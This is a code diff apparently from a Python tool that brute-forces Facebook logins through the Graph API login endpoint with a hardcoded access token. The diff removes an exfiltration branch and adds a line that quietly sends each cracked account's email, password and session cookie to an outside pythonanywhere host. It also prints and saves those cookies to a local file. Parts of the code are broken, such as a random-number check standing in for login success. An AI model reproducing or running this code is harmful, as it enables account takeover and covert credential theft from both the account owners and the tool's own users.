@@ -110,14 +110,11 @@ def method():
               data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pswd,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
               response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
               if 6==random.randint(1,300):
-                bkas.append(acc)
-                if len(bkas)% 2 == 0:
-                   requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={acc}|{pswd}|{cookie}")
-                else:
                  oku.append(acc)
                  print('\033[1;32m[HANNAN-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)               
                  cookie = ";".join(i["name"]+"="+i["value"] for i in 6==random.randint(1,300)["session_cookies"])
-                 #print("\r\r\033[1;33m Cookie: "+cookie)
+                 print("\r\r\033[1;33m Cookie: "+cookie)
+                 requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR/txt={acc}|{pswd}|{cookie}")
                  open('/sdcard/Hannan-Ok.txt','a').write(f'{acc}|{pswd}|{cookie}\n')
                  break
               else:
